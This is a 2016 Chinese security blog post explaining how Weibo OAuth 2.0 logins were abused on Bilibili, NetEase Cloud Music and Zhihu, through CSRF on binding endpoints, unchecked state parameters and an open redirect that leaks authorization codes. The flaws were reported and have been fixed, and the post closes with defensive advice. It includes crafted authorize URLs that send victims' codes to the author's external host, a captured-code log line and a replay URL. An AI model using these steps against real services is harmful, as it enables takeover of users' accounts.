title: "“脆弱”的微博OAuth 2.0"
date: 2016-02-16 22:19:40
tags: [安全, OAuth 2.0]
---

## 前言

这篇文章将介绍WEB网站在接入第三方账号系统：新浪微博进行用户身份验证登录时会遇到的几个问题。前段时间我在乌云上报了几个与这方面相关的漏洞，后面的内容会有实际的例子进行说明，不过存在的问题都已经得到修复。

## 新浪微博的OAuth 2.0

接下来以开发者的角度来描述一下登录的过程。

1. 用户通过浏览器访问Web网站并通过希望通过新浪微博进行登录，我们需要将其引导到以下的页面：`https://api.weibo.com/oauth2/authorize?client_id=YOUR_CLIENT_ID&response_type=code&redirect_uri=YOUR_REGISTERED_REDIRECT_URI`
2. 用户填写微博的账号及密码，同意授权后新浪微博会将页面跳转到`YOUR_REGISTERED_REDIRECT_URI/?code=CODE`
3. 后台通过这个接口就可以拿到用户的授权码，使用这个code，我们就可以在后台通过新浪提供的API：`https://api.weibo.com/oauth2/access_token?client_id=YOUR_CLIENT_ID&client_secret=YOUR_CLIENT_SECRET&grant_type=authorization_code&redirect_uri=YOUR_REGISTERED_REDIRECT_URI&code=CODE`，获取访问用户资源的Access Token，从而使用用户的身份完成一些授权的操作，如获取微博的账号信息。

而在一些网站应用中，也允许用户的账号去绑定新浪微博的账号，然后就可以通过新浪微博进行登录，例如知乎，其绑定账号的过程也是类似上面的流程。

相关链接：[Web网站的授权](http://open.weibo.com/wiki/%E6%8E%88%E6%9D%83%E6%9C%BA%E5%88%B6%E8%AF%B4%E6%98%8E)

## 各种姿势

### 0x00 绑定接口的CSRF
案例：[点我的链接我就可能会进入你的B站账号](http://wooyun.org/bugs/wooyun-2016-0169000)

首先得感谢一下[@呆子不开口](http://wooyun.org/whitehats/%E5%91%86%E5%AD%90%E4%B8%8D%E5%BC%80%E5%8F%A3)，这个姿势是从他那里学习来的。用一句话总结一下：发起绑定第三方账号的接口存在CSRF问题，导致用户点击攻击者构造的页面后，攻击者的微博就绑定到了用户的账号下，从而造成攻击者能以受害用户的身份登录网站。接下来我将以B站之前存在的漏洞来说明构造攻击页面的过程。

1. 在攻击页面中，用户点击页后，我们要先在用户的浏览器上登录指定的微博账号。注意该账号要先授权给bilibili，因为新浪微博的授权有如下特点，如果当前登陆的微博曾经授权过bilibili，那么就会自动跳过前面的授权步骤直接完成绑定。登录微博的过程我用的方式比较简单粗暴，使用的是`http://weibo.cn`的登录接口。注：当时这个接口不需要验证码，现已加上，所以也就不存在登录CSRF的问题了。
2. 登录微博完成后，我们利用js在页面中插入一个`img`标签，指定src为`https://account.bilibili.com/login?sns=weibo`，加载完成后，我们的微博账号就绑定到了用户的账号中。

### 0x01 没有完整验证绑定流程

案例：[点我的链接我就可能会进入你的网易云音乐](http://wooyun.org/bugs/wooyun-2016-0170272)

网易云音乐的绑定微博账号流程如下：
1. GET `http://music.163.com/api/sns/authorize?callbackType=Binding&clientType=web2&forcelogin=true&snsType=2&csrf_token=d0728eed66ae5189b66579d943559dc4`
2. 302调整到：`https://api.weibo.com/oauth2/authorize?client_id=301575942&response_type=code&redirect_uri=http://music.163.com/back/weibo&scope=friendships_groups_read,statuses_to_me_read,follow_app_official_microblog&state=pYkkCeJkYU&forcelogin=true&csrf_token=d0728eed66ae5189b66579d943559dc4`
3. 用户授权完成后，跳转到`http://music.163.com/back/weibo?state=pYkkCeJkYU&code=0e9e160fbbec0955f6e04a7c79b2e5fb`

可以看到，发起绑定的接口用了`csrf_token`参数来防止CSRF攻击，因此不存在上面提到的问题。然而百密一疏，我们可以跳过第一步，直接引导用户到第二步，如果第三步`/back/weibo`这个接口没有验证state参数同时也没有验证用户是否主动发起过绑定，那么我们就可以用先登录指定微博，然后将该微博绑定到用户账号的方式，获取用户登录网易云音乐的权限。state参数就是用来防止这种情况的，然而云音乐的开发者并没有好好用上，引用一下新浪的文档：
>用于保持请求和回调的状态，在回调时，会在Query Parameter中回传该参数。开发者可以用这个参数验证请求有效性，也可以记录用户请求授权页前的位置。这个参数可用于防止跨站请求伪造（CSRF）攻击

具体的过程如下：
1. 用户登录了网易云音乐，点击了攻击者的链接
2. 在攻击者的页面中，主要过程是利用新浪微博的登录接口先登录攻击者的微博账号，注：攻击者的微博账号需要先授权给网易云音乐并关注，然后前端偷偷跳转到下面的地址，就可以将攻击者的微博账号绑定到用户的账号中`https://api.weibo.com/oauth2/authorize?client_id=301575942&response_type=code&redirect_uri=http://music.163.com/back/weibo&scope=friendships_groups_read,statuses_to_me_read,follow_app_official_microblog`
3. 攻击者利用自己的微博账号即可登录受害者的网易云音乐的账号

### 0x02 用户授权code被盗

先说一下效果，用户在微博点击我构造好的URL之后，我就可以骗到该用户的授权code，利用这个code我们就可以以用户的身份登录其授权过的某些网站。至于要怎么做到，后面我用知乎的例子来说明吧，目前也修复了。

案例链接：[微博上你点我链接我就上你绑定过的知乎账号](http://wooyun.org/bugs/wooyun-2016-0174018)和[微博上你点我链接我就上你绑定过的网易通行证（涉及考拉海购/BOBO/同城约会等）](http://wooyun.org/bugs/wooyun-2016-0175030) 

在知乎上，页面中的URL链接都是使用了一个接口进行跳转的，例如我在知乎上不要脸地回答了一个问题的[答案](https://www.zhihu.com/question/37062603/answer/71139922)中 ，里面的URL都是类似这样子的
```
https://link.zhihu.com/?target=http%3A//www.wooyun.org/whitehats/zhchbin
```
这个URL能够跳转到任意的网址，且不需要用户确认！我们可以利用这个问题来做什么的？接下来就看我一步步构造一个恶意的URL。上面的接口是HTTPS的，而我的网站只支持HTTP，为了从`referrer`偷到用户的code信息，所以我先试了一下http是否可以，发现是没问题的。课外知识：[关于https -> http 跳转的referrer](http://serverfault.com/questions/520244/referer-is-passed-from-https-to-http-in-some-cases-how)

NEXT：知乎登录页面中的微博登录是跳转到如下的URL：

```
https://api.weibo.com/oauth2/authorize?
scope=email&
state=e9887b485320b0cab80b0d029e92759f&
redirect_uri=https%3A%2F%2Fwww.zhihu.com%2Foauth%2Fcallback%2Flogin%2Fsina&
response_type=code&
client_id=3063806388
```

由之前的基础知识我们可以知道，要想拿到code，就得利用`redirect_uri`参数跳转到我们自己的网站。但是这里有个域名的限制，如果你把redirect_uri直接改成其他网站，微博是会报`(error:redirect_uri_mismatch)`错误的，所以我们只能使用知乎下的域名。经测试：在接入微博登录的过程中，微博开放平台会要求验证域名是否属于我们。如果填入的域名是xxx.com，则该域名和其子域名下的任何接口都能与`client_id`匹配而不会报错。而测试后我猜测知乎用的域名是`zhihu.com`，所以`link.zhihu.com`也能与client_id匹配。所以利用上面的接口，构造出以下的URL：

```
https://api.weibo.com/oauth2/authorize?
scope=email&
state=e9887b485320b0cab80b0d029e92759f&
redirect_uri=http%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttp%3A%2F%2Fa.zhchbin.xyz%2Fauth%3F&
response_type=code&
client_id=3063806388
```
一个在授权过知乎的微博用户点击上面的URL后，新浪微博就会加上code参数并自动跳转到redirect_uri参数指定的URL。微博这样便利的默认行为，在这里帮了大忙。如果伪装的好，用户点了链接之后会根本就不知道发生了什么事情。

```
http://link.zhihu.com/?target=http://a.zhchbin.xyz/auth?&state=e9887b485320b0cab80b0d029e92759f&code=776b93bbf6b2474067f593d743f36380
```
NEXT：上面的URL页面会使用JS调整到target参数中，这个时候我们查看一下auth接口的referrer，就可以找到用户的code，例如：
```
[31/Jan/2016:15:28:31 +0800] "GET /auth? HTTP/1.1" 404 402 "http://link.zhihu.com/?target=http://a.zhchbin.xyz/auth?&state=e9887b485320b0cab80b0d029e92759f&code=ad3d1b20385f891a36e498cb470146e5" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36" "2.94"
```

拿到这个code参数之后，在我们自己的浏览器中打开下面的链接，就可以以受害用户的身份来登录知乎了

```
https://www.zhihu.com/oauth/callback/login/sina?
state=17324074ce785e6296061cf1381f6f8b&
code=ad3d1b20385f891a36e498cb470146e5
```

其中state参数的值是知乎首页的cookie中_xsrf对应的值。目前知乎已经修复这个问题，具体的修复方式就没有认真研究，我觉得最好的方式是在URL跳转前加一个安全提示，让用户确认的。

## 总结

可以发现OAuth2.0整个过程中都有不少容易被忽略的点，这里总结一下我认为的要写好第三方通信证登录及账号绑定需要注意的事情：

1. 发起绑定的接口不能存在CSRF问题。鬼知道用户浏览器上登录的微博账号就一定是用户的呢，你说对不。
2. 用好OAuth2.0的State参数，用的好，就不会有上面提到的网易云音乐类似问题，还是要防止CSRF问题的。RFC中对这个参数是推荐的哦。
3. 我觉得OAuth2.0的认证服务器在给开发者接入的时候应该要求使用完整的redirect_uri参数，而不是域名。而对于开发者，你无法改变微博的登记方式，只能让自己的站点不要存在任意URL调整的问题，比如能在跳转到其他站点前提示一下用户就提示一下。注：网易通信证那个问题，也是一个奇葩的任意URL跳转。

PS：我书读得少，脑子不好使，以上内容如有错误，请和谐点指出。

最后还是要放几个链接：

* http://drops.wooyun.org/web/12695
* http://weibo.com/p/1001603921767675649900?from=page_100505_profile&wvr=6&mod=wenzhangmod
* https://github.com/knownsec/KCon/blob/master/KCon%20V3/%E5%88%A9%E7%94%A8OAuth%E5%8A%AB%E6%8C%81%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD.ppt
* http://drops.wooyun.org/papers/598